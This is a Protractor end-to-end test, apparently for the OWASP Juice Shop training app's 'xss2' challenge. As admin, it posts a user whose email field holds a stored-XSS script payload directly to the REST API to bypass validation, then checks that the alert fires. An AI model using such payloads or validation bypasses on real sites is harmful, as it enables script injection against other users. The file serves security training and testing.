'use strict'

describe('/#/register', function () {
  protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'})

  beforeEach(function () {
    browser.get('/#/register')
  })

  describe('challenge "xss2"', function () {
    it('should be possible to bypass validation by directly using Rest API', function () {
      var EC = protractor.ExpectedConditions

      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/api/Users\', {email: \'<script>alert("XSS2")</script>\', password: \'xss\'});')

      browser.get('/#/administration')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS2' alert is not present")
      browser.switchTo().alert().then(function (alert) {
        expect(alert.getText()).toEqual('XSS2')
        alert.accept()

        browser.ignoreSynchronization = true
        browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.put(\'/api/Users/5\', {email: \'alert disabled\'});')
        browser.driver.sleep(1000)
        browser.ignoreSynchronization = false
      })
    })

    protractor.expect.challengeSolved({challenge: 'xss2'})
  })
})
